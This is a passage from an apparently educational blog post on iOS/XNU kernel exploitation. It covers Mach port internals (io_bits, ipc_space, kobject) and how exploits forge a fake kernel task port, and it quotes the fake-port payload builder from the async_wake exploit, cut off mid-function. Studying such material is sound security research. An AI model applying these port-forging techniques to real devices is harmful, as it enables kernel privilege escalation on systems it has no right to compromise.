    &lt;span class=&quot;mi&quot;&gt;127&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_LABELH&lt;/span&gt;			&lt;span class=&quot;mi&quot;&gt;35&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_TASK_RESUME&lt;/span&gt;		&lt;span class=&quot;mi&quot;&gt;36&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;129&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_VOUCHER&lt;/span&gt;			&lt;span class=&quot;mi&quot;&gt;37&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;130&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_VOUCHER_ATTR_CONTROL&lt;/span&gt;	&lt;span class=&quot;mi&quot;&gt;38&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;131&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_WORK_INTERVAL&lt;/span&gt;              &lt;span class=&quot;mi&quot;&gt;39&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;132&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_UX_HANDLER&lt;/span&gt;                 &lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;133&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;134&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/*
    135:  * Add new entries here and adjust IKOT_UNKNOWN.
    136:  * Please keep ipc/ipc_object.c:ikot_print_array up to date.
    137:  */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;138&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_UNKNOWN&lt;/span&gt;                    &lt;span class=&quot;mi&quot;&gt;41&lt;/span&gt;      &lt;span class=&quot;cm&quot;&gt;/* magic catchall       */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;139&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;IKOT_MAX_TYPE&lt;/span&gt;	&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IKOT_UNKNOWN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* # of IKOT_ types	*/&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;140&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;141&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;142&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is_ipc_kobject&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;	&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ikot&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_NONE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;143&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Setting the &lt;strong&gt;io_bits&lt;/strong&gt; field of the ports would look as simple as this.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;cp&quot;&gt;#define IO_BITS_ACTIVE 0x80000000
&lt;/span&gt;    &lt;span class=&quot;cp&quot;&gt;#define	IKOT_TASK 2
&lt;/span&gt;    &lt;span class=&quot;cp&quot;&gt;#define IKOT_CLOCK 25
&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;fakeport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io_bits&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IO_BITS_ACTIVE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_CLOCK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;secondfakeport&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io_bits&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_TASK&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IO_BITS_ACTIVE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The &lt;strong&gt;io_references&lt;/strong&gt; field of the &lt;strong&gt;ipc_object&lt;/strong&gt; would also need to be set to anything other than 0, just to make sure the object isn’t deallocated.&lt;/p&gt;

&lt;p&gt;Coming back to the port structure, one of the other important fields is the &lt;strong&gt;struct ipc_space *receiver&lt;/strong&gt; field which points to the &lt;strong&gt;ipc_space&lt;/strong&gt; struct. The &lt;strong&gt;ipc_space&lt;/strong&gt; structure for a task defines its IPC abilities. Each IPC capability is represented by an &lt;strong&gt;ipc_entry&lt;/strong&gt; and put in a table, which is pointed to by the &lt;strong&gt;is_table&lt;/strong&gt; field in the &lt;strong&gt;ipc_space&lt;/strong&gt; struct. The port rights or capablities in the &lt;strong&gt;is_table&lt;/strong&gt; are 16 bits and have a name which is actually an index onto the &lt;strong&gt;is_table&lt;/strong&gt;. It is important to note that within the kernel, port rights (&lt;strong&gt;mach_port_t&lt;/strong&gt;) are represented by passing a pointer to the appropriate port data structure (&lt;strong&gt;ipc_port_t&lt;/strong&gt;).&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;nl&quot;&gt;File:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;osfmk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ipc_space&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;h&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;114&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 
    &lt;span class=&quot;mi&quot;&gt;115&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_space&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;116&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;lck_spin_t&lt;/span&gt;	&lt;span class=&quot;n&quot;&gt;is_lock_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;117&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;ipc_space_refs_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is_bits&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* holds refs, active, growing */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;118&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;ipc_entry_num_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is_table_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* current size of table */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;119&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;ipc_entry_num_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is_table_free&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* count of free elements */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;120&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;ipc_entry_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is_table&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;		&lt;span class=&quot;cm&quot;&gt;/* an array of entries */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;121&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;task_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is_task&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                 &lt;span class=&quot;cm&quot;&gt;/* associated task */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;122&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipc_table_size&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;is_table_next&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* info for larger table */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;123&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;ipc_entry_num_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is_low_mod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* lowest modified entry during growth */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;124&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;n&quot;&gt;ipc_entry_num_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is_high_mod&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;cm&quot;&gt;/* highest modified entry during growth */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;125&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bool_gen&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bool_gen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;       &lt;span class=&quot;cm&quot;&gt;/* state for boolean RNG */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;126&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is_entropy&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IS_ENTROPY_CNT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* pool of entropy taken from RNG */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;127&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; 	&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;is_node_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;			&lt;span class=&quot;cm&quot;&gt;/* HOST_LOCAL_NODE, or remote node if proxy space */&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;128&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
    &lt;span class=&quot;mi&quot;&gt;129&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;The IPC space is a very important struct, and hence most exploits look for the kernel &lt;strong&gt;ipc_space&lt;/strong&gt; in order to get a proper (yet fake) kernel task port. The trick has been to copy the &lt;strong&gt;ipc_space_kernel&lt;/strong&gt; to a new memory and make your fake port’s &lt;strong&gt;receiver&lt;/strong&gt; field point to it.&lt;/p&gt;

&lt;p&gt;The &lt;strong&gt;kobject&lt;/strong&gt; field points to different data structures depending on the &lt;strong&gt;kobject&lt;/strong&gt; type set in the &lt;strong&gt;io_bits&lt;/strong&gt; field. Hence if you are faking a task port, you need to point the &lt;strong&gt;kobject&lt;/strong&gt; field to a &lt;strong&gt;struct task&lt;/strong&gt;, and in case of a clock, a &lt;strong&gt;struct clock&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;That’s it, so you need to fake the port until you make it :). Here is an example of creating a fake port from the async_wake exploit.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-c&quot; data-lang=&quot;c&quot;&gt;    &lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;build_message_payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dangling_port_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message_body_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message_body_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vm_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;receiver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;**&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;context_ptr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;body&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;malloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;message_body_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
      &lt;span class=&quot;n&quot;&gt;memset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message_body_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

      &lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port_page_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dangling_port_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xfff&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

      &lt;span class=&quot;c1&quot;&gt;// structure required for the first fake port:&lt;/span&gt;
      &lt;span class=&quot;kt&quot;&gt;uint8_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;body&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port_page_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;message_body_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;koffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSTRUCT_OFFSET_IPC_PORT_IO_BITS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IO_BITS_ACTIVE&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;IKOT_TASK&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;koffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSTRUCT_OFFSET_IPC_PORT_IO_REFERENCES&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xf00d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// leak references&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint32_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;koffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSTRUCT_OFFSET_IPC_PORT_IP_SRIGHTS&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0xf00d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// leak srights&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;koffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSTRUCT_OFFSET_IPC_PORT_IP_RECEIVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;receiver&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;koffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x123456789abcdef&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;context_ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;koffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;

      &lt;span class=&quot;c1&quot;&gt;// set the kobject pointer such that task-&amp;gt;bsd_info reads from ip_context:&lt;/span&gt;
      &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_task_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;koffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSTRUCT_OFFSET_IPC_PORT_IP_CONTEXT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;koffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSTRUCT_OFFSET_TASK_BSD_INFO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

      &lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_task_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dangling_port_address&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_task_offset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
      &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint64_t&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_port&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;koffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_task_address&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

      &lt;span class=&quot;c1&quot;&gt;// when we looked for a port to make dangling we made sure it was correctly positioned on the page such that when we set the fake task&lt;/span&gt;
      &lt;span class=&quot;c1&quot;&gt;// pointer up there it's actually all in the buffer so we can also set the reference count to leak it, let's double check that!&lt;/span&gt;

      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fake_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fake_task_offset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;body&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
